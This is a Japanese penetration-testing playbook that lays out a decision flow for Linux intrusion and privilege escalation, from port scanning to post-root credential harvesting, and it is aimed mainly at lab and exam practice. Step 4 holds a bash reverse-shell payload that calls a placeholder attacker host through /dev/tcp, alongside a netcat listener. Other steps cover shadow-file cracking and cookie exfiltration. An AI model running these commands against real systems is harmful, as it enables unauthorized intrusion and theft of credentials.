# Linux 侵入・権限昇格フロー

調査開始から権限昇格までの判断フロー。各ステップの詳細は対応する .md を参照。

> **本番の場合**：本フローに入る前にスコープ・実施可否・業務影響について事前合意を確認すること。
> 詳細は [`../README.md`](../README.md) Step 0 と [`../06_Concepts/Pentest_Fundamentals.md`](../06_Concepts/Pentest_Fundamentals.md) を参照。
> 演習環境（HTB / OSCP 等）ではこのチェックは不要。

---

## 開始条件の確認

**このファイルを開いたら最初にここを読む。** 手元にある情報によってスタート位置が変わる。

| 提供されている情報 | 開始位置 |
|------------------|---------|
| IPのみ | Step 0（OS判定）→ Step 1（ポートスキャン）から始める |
| 低権限ユーザー（ID/パス）が提供済み | Step 4「経路A」（SSH ログイン）→ Step 5（侵入後列挙）から始める |
| ドメイン/IPのみ・Webスコープ | `Web_Vuln_Flow.md` を参照する |

> **「認証情報が提供済み」でも Step 1〜2（ポートスキャン・列挙）は一通り確認する。**
> 開いているポートが認証情報なしでアクセスできるサービス（FTP匿名・SMB等）を持っていることがあるため。

---

## フロー概要

```
[0. OS判定]
       ↓
[1. ポートスキャン]                      → 01_Reconnaissance/
       ↓
[2. サービス別の列挙]                    → 01_Reconnaissance/
       ↓
[3. 攻撃手法の選択]  ←ここで 02_Initial_Access/ の技術を判断する
       ↓
[4. シェルの取得]                        → 02_Initial_Access/
   ├─ 経路A: 認証情報でサービスにログイン
   └─ 経路B: Web脆弱性→リバースシェル → シェル安定化（必須）
       ↓
[5. 侵入後の列挙]                        → 03_Post_Access_Linux/
       ↓
[6. 権限昇格]                            → 03_Post_Access_Linux/
```

---

## Step 0 — OS判定

→ **`00_OS_Identification.md`** で TTL・ポート構成・HTTP ヘッダー・SMB バナー等の判定方法を確認する。
Linux と確定した上でこのファイルのStep 1以降を進める。

---

## Step 1 — ポートスキャン

> `00_OS_Identification.md` で実施した初期 nmap スキャン（`-sC -sV`）は再利用してよい。
> このStep 1の目的は**追加で全ポートスキャン（`-p-`）を行うこと**。OS判定時のスキャンで見落としたポートを拾う。

まず全ポートをスキャンして開いているサービスを把握する。

```bash
# [Attacker] 全ポートスキャン（必ず実行 — 初期 -sC -sV は上位1000ポートのみで非標準ポートを見逃す）
sudo nmap -p- --min-rate 5000 --reason -oA nmap_allports [TARGET_IP]

# [Attacker] 開いていたポートに絞って スクリプト + バージョン精査
sudo nmap -sC -sV -p[OPEN_PORTS] -oA nmap_detail [TARGET_IP]

# [Attacker] スキャン結果から既知 CVE を一括照合（手動での見落とし防止）
searchsploit --nmap nmap_allports.xml
```

→ 高速化（RustScan / Masscan）・UDP スキャンの詳細: `../01_Reconnaissance/Network_Scanning.md`

**確認ポイント:**

- 21 (FTP), 22 (SSH), 80/443 (HTTP/S) が基本セット
- 非標準ポートに注目（開発環境・管理用途の可能性）
- `nmap -sC -sV` のスクリプトスキャンでバージョン情報を取得
- **スキャン後に `searchsploit --nmap nmap_initial.xml` で既知CVEを一括確認する**（`-oA` で保存した XML が必要）
  → `../01_Reconnaissance/Network_Scanning.md`（Step 5）

**nmap 出力でバックエンド技術を読み取るシグナル：**

| nmap 出力の文字列 | 意味 | 次のアクション |
|----------------|------|-------------|
| `http-server-header: nginx/x.x + Phusion Passenger(R) x.x` | **Ruby / Rails アプリがバックエンドで動いている** | Step 2.9 の PDF 生成フォーム確認・`X-Runtime: Ruby` チェックを優先 |
| `http-title: Convert Web Page to PDF` 等のツール機能名 | URL 入力型の変換機能が存在する | Step 2.9 へ直行して生成物のメタデータ確認（`exiftool`）を実施 |
| `X-Powered-By: Express` / `X-Generator: Drupal` 等 | フレームワーク・CMSが特定できる | バージョンを確認して `searchsploit [フレームワーク名] [バージョン]` |

---

## Step 2 — サービス別の列挙

### Webサービス（80/443 または非標準ポート）が開いている場合

> **80/443 のみ開いていてSSH等が開いていない場合も、この節のフローを進める。** Web脆弱性を通じたシェル取得が主経路になる。

> **非標準ポート（3000, 8080, 8443, 8888 等）に HTTP サービスが動いていても、この節と同じフローを適用する。** `nmap -sC -sV` がバナーからアプリ名を識別した場合（例：`Grafana`, `Jenkins`, `Gitea`）は、**即そのアプリ名 + バージョンで searchsploit / NVD を検索する**。ログインページのフッター・ヘッダー・`/api/health` 等でバージョンを確認してから CVE を探す。

> **【先に確認】nmap の出力に `Location: http://[ドメイン名]/` やホスト名らしき文字列が含まれる場合は `/etc/hosts` に追記してからアクセスする。**
> ```bash
> # [Attacker] /etc/hosts への追記（IP とドメイン名は環境に合わせて変更）
> echo '[IP] [ドメイン名]' | sudo tee -a /etc/hosts
> ```
> IP 直打ちと `/etc/hosts` 追記後のドメイン名アクセスで画面が変わる場合（302 リダイレクト・別コンテンツ等）は、ドメイン名でのアクセスを基本にする。
> → 検出の詳細: `../01_Reconnaissance/Network_Scanning.md`（観点・着眼点テーブル）

1. ブラウザでトップページを確認 → 使用技術・フレームワーク・エンドポイントの把握
2. **`/robots.txt` を確認する（最初の一手）**
   - `Disallow:` エントリが「隠しパス」の地図になる
   - 管理画面・CMSインストールパスが見つかることがある
   - nmap `-sC` でもスキャン結果に自動表示される
   → 詳細: `../01_Reconnaissance/Web_Enumeration.md`（robots.txt の確認）
3. **Webアプリのバージョンを特定する**
   - ヘッダー・フッター・ログインページ・`/api/health` 等にバージョンが表示されていないか確認
   - 判明したら即 `searchsploit [アプリ名] [バージョン]` で既知脆弱性を検索
   - CVE が見つかった場合、パストラバーサル / RCE 等の深刻な脆弱性が優先
4. gobuster / ffuf でディレクトリ列挙 → `../01_Reconnaissance/Web_Enumeration.md`（ディレクトリ・エンドポイントの列挙）
5. **エンドポイントのIDやパラメータに連番・予測可能な値がないか確認** → IDOR の可能性
6. vhost（仮想ホスト）のファジングを検討
7. **JS ソースに難読化コードがある場合はデコードしてAPIエンドポイントを発見する**
   - `eval(function(p,a,c,k,e,d){...})` が見えたらブラウザ Console で `eval → console.log` に置換
   - APIレスポンスのエンコーディング種別（ROT13 / Base64 等）も確認する
   → `../02_Initial_Access/Web_Vulnerabilities/JS_Obfuscation.md`
8. **APIが `username`, `host`, `ip` 等のパラメータを受け取る場合はコマンドインジェクションを試みる**
   - まず管理者APIへの権限昇格（`is_admin=1` 等のパラメータ改ざん）を確認
   - `; id` で注入テスト → リバースシェルへ
   → `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`
9. **URL を入力して何かを生成・取得するフォームがある場合（PDF 生成・プレビュー・スクリーンショット等）**
   - レスポンスヘッダーで使用言語・ライブラリを確認（`X-Runtime: Ruby` / `X-Powered-By` 等）
   - 生成物（PDF・画像等）のメタデータからライブラリ名・バージョンを確認（`exiftool` / strings）
   - バージョンが特定できたら即 `searchsploit [ライブラリ名] [バージョン]` で CVE を検索
   - **PDFKit 0.8.6 以下なら CVE-2022-25765（バックティック URL 注入 → RCE）が有効**
   - SSRF として内部ネットワーク探索にも使える可能性がある
   → `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`（PDFKit セクション）

→ 詳細: `../01_Reconnaissance/Web_Enumeration.md`
→ CVE 検索: `../05_Tools_Reference/Searchsploit.md`
→ パストラバーサル: `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
→ 見たことのない技術・機能に当たって脆弱性クラスが特定できない場合: `../00_Playbook/01_Unknown_Tech_Research.md`

### SSHが開いている場合
- バナー・バージョンを確認する（`nmap -sV` の出力）
- 古いバージョンはユーザー列挙の脆弱性が存在する場合がある
- 認証情報が判明したら直接ログインを試みる
- **見つかった秘密鍵（`id_rsa` 等）がある場合はパスフレーズをクラックする**

→ 詳細: `../02_Initial_Access/SSH.md`（バナー観察〜認証突破〜制限シェル脱出まで）

### FTPが開いている場合
- 匿名ログインを試行 (`ftp anonymous@`)
- ファイルがあればダウンロードして内容確認
- **FTPは平文通信** → ネットワークキャプチャファイル（PCAP）があれば認証情報が含まれている可能性

→ 詳細: `../02_Initial_Access/FTP.md`（バナー観察〜匿名取得〜書込判定〜辞書攻撃〜既知 CVE まで）

### SMB（139/445）が開いている場合
- まず匿名 / Guest で共有を列挙する
- **バナーが `Samba`（Linux 実装）なら版数を確定し、既知 CVE を最優先で照合する。** Windows AD 前提の NETLOGON / SYSVOL / GPP 列挙は Linux 上の Samba には基本当てはまらない
- 非標準共有（`IPC$` / `ADMIN$` 以外）が見えたら必ず接続して中を見る（`-L` は一覧表示なので、中身は共有名を指定して接続する）

```bash
# [Attacker] 共有一覧（匿名）
smbclient -L //[TARGET_IP] -N
# [Attacker] Samba 版数の確定（CVE 照合の前提）
nmap -p139,445 -sV --script smb-os-discovery [TARGET_IP]
# [Attacker] 非標準共有の中を見る（-L ではなく共有名を指定して接続）
smbclient //[TARGET_IP]/[SHARE] -N -c "ls"
```

→ 列挙の詳細: `../01_Reconnaissance/SMB_Enumeration.md`
→ Samba 版数依存 CVE による侵入（usermap script / SambaCry 等）: `../02_Initial_Access/Samba_Exploitation.md`

---

## Step 3 — 攻撃手法の選択

Step 2の列挙結果を元に、「今の状況でどの手法を試すか」を以下の判断基準で選択する。
**複数の候補が重なる場合は、より確実性が高い（証拠が強い）ものから試みる。**

---

### 判断表：状況 → 試すべき手法

| 列挙で得られた情報 | 試すべき手法 | 参照先 |
|----------------|-----------|--------|
| Webアプリのバージョンが判明した | searchsploit で既知CVEを検索 → パストラバーサル / RCE 等 | `../05_Tools_Reference/Searchsploit.md` |
| ログインフォームがある | SQLi / デフォルト認証情報 | `../02_Initial_Access/Web_Vulnerabilities/SQLi.md` |
| URLに `/item/123` 等の連番IDがある | IDOR（他ユーザーのオブジェクトに直接アクセス） | `../02_Initial_Access/Web_Vulnerabilities/IDOR.md` |
| ファイルダウンロード機能・パラメータにパスが含まれる | パストラバーサル | `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md` |
| JSソースに難読化コードがある | JS解析 → 隠しAPIエンドポイントの発見 | `../02_Initial_Access/Web_Vulnerabilities/JS_Obfuscation.md` |
| APIが `username`/`host` 等のパラメータを受け取る | OSコマンドインジェクション（; id で確認） | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
| 入力フォームにスクリプトが通る | XSS（セッショントークン窃取等） | `../02_Initial_Access/Web_Vulnerabilities/XSS.md` |
| 入力フォーム本文の `<script>` は弾かれるが、エラーページにリクエストヘッダー（User-Agent / Referer）が反射される | ヘッダー注入経由の XSS。「管理者にレポート送信」文言があれば Blind XSS で cookie exfil を狙う | `../02_Initial_Access/Web_Vulnerabilities/XSS.md`（ヘッダー注入経路） |
| stolen cookie で管理画面に入れた → 管理画面に input フォームがある | 管理者専用APIにコマンドインジェクションがある典型パターン | `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md` |
| バイナリ・設定ファイルが取得できた | strings / 逆コンパイル → 認証情報 | `../02_Initial_Access/Binary_Analysis.md` |
| PCAPファイルが取得できた | tshark で平文認証情報を抽出 | `../02_Initial_Access/Credential_Discovery.md` |
| FTPに匿名ログインできた | ダウンロードしたファイルの内容確認・認証情報探索 | `../02_Initial_Access/FTP.md` |
| SSH のバージョンが古い | SSH 脆弱性 / ユーザー列挙 | `../02_Initial_Access/SSH.md` |
| SMB バナーが `Samba`（Linux）でバージョンが古い | 版数依存 CVE（usermap script / SambaCry 等） | `../02_Initial_Access/Samba_Exploitation.md` |
| SMB で非標準共有・書込可能共有が見える | 共有内ファイル精査 / 書込経由の侵入 | `../01_Reconnaissance/SMB_Enumeration.md` |
| `-p-` で 3632/tcp distccd が見える | CVE-2004-2687 未認証コマンド実行（非特権足場→要昇格） | `../02_Initial_Access/distcc_Exploitation.md` |

---

### 認証情報が手に入ったら

どの手法で取得した認証情報であっても、すぐに全サービスで使い回しを確認する。

→ `../02_Initial_Access/Credential_Discovery.md`（パスワード使い回し確認の表）

---

## Step 4 — シェルの取得

Step 3で得た手法によって、シェル取得までの経路が異なる。

### 経路A: 認証情報でサービスに直接ログインする場合

```bash
# SSH でのログイン（最も一般的）
ssh [USER]@[TARGET_IP]

# FTP へのログイン
ftp [TARGET_IP]

# WinRM（Linuxにはほぼないが混在環境では稀にある）
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASS]'
```

パスワードが通ったら Step 5 へ進む。通らない場合は別のユーザー・別のサービスで試す。

---

### 経路B: Web脆弱性・コマンドインジェクション経由でシェルを取得する場合

脆弱なAPIやWebフォームを通じてOSコマンドを実行させ、リバースシェルを引き込む。

**事前確認（推奨）**：リバースシェルの概念・nc リスナーを先に起動する理由が初めての場合 → `../06_Concepts/Reverse_Shell.md`

**攻撃側でリスナーを起動してから、**

```bash
nc -lvnp 4444
```

**ペイロードをWebアプリ・APIに送り込む（コマンドインジェクションの例）：**

```bash
bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'
```

→ 詳細手順（APIパラメータ改ざんによる権限昇格・クォートエスケープ等）: `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`

---

### 経路B取得後：シェルの安定化（必須）

リバースシェルは TTY なしの「ダムシェル」のため、**直ちに安定化しないと `sudo`・`su` 等が使えない。**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo → fg
```

→ 詳細手順・代替手段: `../03_Post_Access_Linux/Shell_Stabilization.md`

---

## Step 5 — 侵入後の列挙

シェルを得たら以下を確認する（詳細は `../03_Post_Access_Linux/Enumeration_Checklist.md`）:

> **ファイル検索・プロセス観察・文字列調査・データ持ち出しの bash / coreutils ワンライナー**（`find` の権限フィルタ、`grep -r` での認証情報抜き出し、`/dev/tcp` 転送 等）でターゲット側に `python` / `curl` が無い場合の代替も含む → `../05_Tools_Reference/Linux_Pentest_OneLiners.md`（§2 ファイル検索 / §3 プロセス観察 / §4 文字列調査 / §6 ファイル転送）

| 優先度 | 確認内容 | コマンド |
|--------|----------|---------|
| 高 | 現在のユーザーと権限 | `id`, `whoami` |
| 高 | **`id` のグループを精査する** | `id` 出力の `groups=` を確認 |
| 高 | Linux Capabilities | `getcap -r / 2>/dev/null` |
| 高 | SUID/SGID バイナリ | `find / -perm -4000 -type f 2>/dev/null` |
| 高 | sudo 権限 | `sudo -l` |
| 中 | 実行中プロセス | `ps aux` |
| 中 | **短命な root プロセス（SSH ログイン引き金 / cron 系）** | **`pspy64`（`ps aux` には映らない数百ms完結のプロセスを捕捉）** → `../05_Tools_Reference/pspy.md` |
| 中 | ネットワーク接続 | `ss -tlnp`, `netstat -tlnp` |
| 中 | 環境変数 | `env` |
| 低 | crontab | `crontab -l`, `/etc/cron*` |
| 低 | 書き込み可能なディレクトリ | `find / -writable -type d 2>/dev/null` |

**`id` のグループで注目すべき組み合わせ：**

| グループ | 確認すべき手法 |
|---------|-------------|
| `staff` | `/usr/local/sbin` への書き込み + PAM PATH ハイジャック |
| `docker` | コンテナ経由のホストマウント |
| `lxd` | 特権コンテナのホストマウント |
| `disk` | `debugfs` による生デバイスアクセス |
| `shadow` | `/etc/shadow` 直読み → ハッシュクラック |

→ 詳細: `../03_Post_Access_Linux/Enumeration_Checklist.md`（`id` 出力の読み方）

---

## Step 6 — 権限昇格の判断

### Capabilities が設定されている場合（最優先確認）

```bash
getcap -r / 2>/dev/null
```

`cap_setuid` が設定されたバイナリ（python, perl, ruby等）があれば root 昇格の可能性が高い。

→ 詳細: `../03_Post_Access_Linux/Capabilities.md`

### SUID バイナリがある場合

GTFOBins で確認。標準バイナリ（find, vim, python等）に SUID が設定されていれば悪用できる場合がある。

→ 詳細: `../03_Post_Access_Linux/SUID_SGID.md`

### sudo -l で特定コマンドが許可されている場合

**シグナル → 次アクション（sudo -l 出力パターン別）：**

| `sudo -l` に見える要素 | 次のアクション |
|----------------------|-------------|
| `NOPASSWD: /usr/bin/vim` / `python3` / `find` 等のバイナリ | GTFOBins で「Sudo」セクションを確認 |
| `NOPASSWD: /usr/bin/ruby [スクリプトパス]` | スクリプトを `cat` して `YAML.load` を使っているか確認 → パターン5 |
| `NOPASSWD: /usr/bin/python3 [スクリプトパス]` | スクリプトを `cat` して `pickle.load` / `eval` を使っているか確認 → パターン5 |
| スクリプトが `YAML.load` + ユーザー書き込み可能なファイルを読む | **Psych Gadget Chain で任意コード実行が可能** |
| スクリプトが `YAML.safe_load` を使っている | Gadget Chain は使えない。他の手法（PATH ハイジャック等）を探す |
| **`NOPASSWD: /usr/bin/[シェルスクリプト名]`（自作スクリプト）** | **`cat` して内部呼び出しの形式を確認 — `./xxx.sh` のような相対呼び出しがあれば CWD ハイジャック → パターン6** |
| **`secure_path` が設定されているのに sudo スクリプトが内部で `./xxx` を呼ぶ** | **PATH ハイジャックは効かないが CWD ハイジャックは別経路で成立 → パターン6** |
| **`pgrep -x "[サービス名]"` で「動いていなければ ./[サービス名] を起動」のロジックがある** | **常時動いていない service → CWD ハイジャックの発火条件が常時成立 → パターン6** |

→ 詳細: `../03_Post_Access_Linux/Sudo_Misconfig.md`

### `staff` グループに所属している場合（PAM PATH ハイジャック）

**成立条件（Playbook 側で素早く確認する 4 点）：**
1. `id` の出力に `staff` が含まれる
2. `ls -la /usr/local/sbin/` で書き込み権限がある（`staff` が `/usr/local` に書ける慣習）
3. `/etc/update-motd.d/` 配下にスクリプトが存在し、フルパスなしで外部コマンド（`run-parts` 等）を呼んでいる
4. SSH ログインを引き金にできる（自分で再ログイン可能）

> **条件 3 の確認は `cat /etc/update-motd.d/*` だけでは不十分。** 実際に root が SSH ログイン時に何を実行しているかは `pspy` で観察するのが確実。`pspy` 起動中に別端末から SSH ログインすると、`UID=0 ... run-parts --lsbsysinit /etc/update-motd.d` のような出力が見えるはず。
> → 観察手順: `../05_Tools_Reference/pspy.md`

→ 詳細手順（スクリプト配置・引き金の引き方・失敗パターン）: `../03_Post_Access_Linux/PAM_Misconfig.md`
→ 原理（なぜ PAM session が root 権限で外部コマンドを呼ぶのか）: `../06_Concepts/PAM.md`

**条件4が満たせない場合（www-data等でSSH再ログインが不可能な場合）：**
この手法は使えない。SUID / Capabilities / sudo -l 等の別経路を探す。

### カーネルバージョンが古い場合

**シグナル → 次アクション：**

| `uname -a` の出力 | 次に確認すること |
|----------------|--------------|
| ビルド日時が2年以上前 | `searchsploit linux kernel [バージョン系列]` で CVE 候補を確認 |
| `/var/mail/[USERNAME]` に脆弱性名・技術名の言及あり | その技術名・CVEを最優先に searchsploit / GitHub で調べる |
| `findmnt \| grep overlay` でOverlayFSが使われている | OverlayFS 系カーネルCVEの適用条件が整っている可能性 |

PoC取得→ターゲットへの転送→コンパイル（gcc / make）→実行の流れが典型。

→ 詳細手順（CVE選択基準・PoC転送・コンパイル・2プロセス並行実行等）: `../03_Post_Access_Linux/Kernel_Exploits.md`

---

### `sudo -l` に `docker exec *` の NOPASSWD がある場合（重要）

**シグナル → 次アクション：**

| `sudo -l` の出力 | 次に確認すること |
|---------------|--------------|
| `NOPASSWD: /snap/bin/docker exec *` / 同等のワイルドカード | コンテナ内 root で任意コマンド実行可能 → ホストブレイクアウトを試す |
| `NOPASSWD: /usr/bin/docker` 無条件 | コンテナ作成から自由にできる。さらに容易 |
| ワイルドカードなし・固定引数 | ホスト側の挙動に踏み込めないので、別経路を探す |

コンテナ内に入った後は「ブロックデバイス（`/dev/sda*` 等）が見えるか」で分岐する。見えればマウントでホスト全体にアクセス可能。

→ 詳細手順（コンテナ内確認・ホストFSマウント・root権限取得の確認）: `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン4）
→ 原理（コンテナがなぜホストデバイスにアクセスできるのか）: `../06_Concepts/Docker_Isolation.md`

---

## 昇格成功後にやること（横展開観点）

**「root 取得＝ゴール」ではない。** 権限昇格できた時点で次の目標は「他ホストへの横展開」「保存された認証情報の収集」「業務影響の評価」へ移行する。
`Windows_AD_Attack_Flow.md` Step 7（DCSync → 全ハッシュ取得）と非対称にならないよう、Linux 側でも以下を確認する。

| 確認項目 | 目的 |
|---------|------|
| `/root/.ssh/` 配下の鍵 | 他ホストへの SSH 接続性 |
| `/etc/shadow` 全エントリのハッシュ | 他システムでのパスワード使い回し検証 |
| `/root/.bash_history` | 直近のクライアント・サービスへの接続履歴 |
| root の cron / systemd サービス | 認証情報埋め込み |
| AD連携設定（kerberos / sssd 等） | ドメイン側の資格情報取得 |
| 内部サービスの管理画面・DB接続情報 | 設定ファイル・環境変数 |

→ 詳細チェックリスト: `../03_Post_Access_Linux/Enumeration_Checklist.md`（root 権限取得後の追加列挙）
→ 取得した認証情報の使い回し確認: `../02_Initial_Access/Credential_Discovery.md`（パスワード使い回し確認の表）

---

## 関連技術

- 前：`00_OS_Identification.md`（Linux と確定してからこのフローに入る）
- 後：`../03_Post_Access_Linux/Enumeration_Checklist.md`（シェル取得後の侵入後列挙・権限昇格）
- 関連：`Web_Vuln_Flow.md`（シェル取得が目的ではなく Web 脆弱性の網羅的洗い出しがスコープの場合はこちら）
- 関連：`External_Service_Recon_Flow.md`（対象がインターネット露出サービス・エッジアプライアンスの場合）
- 関連：`01_Unknown_Tech_Research.md`（Step 2 で脆弱性クラスが特定できない技術に当たった場合）
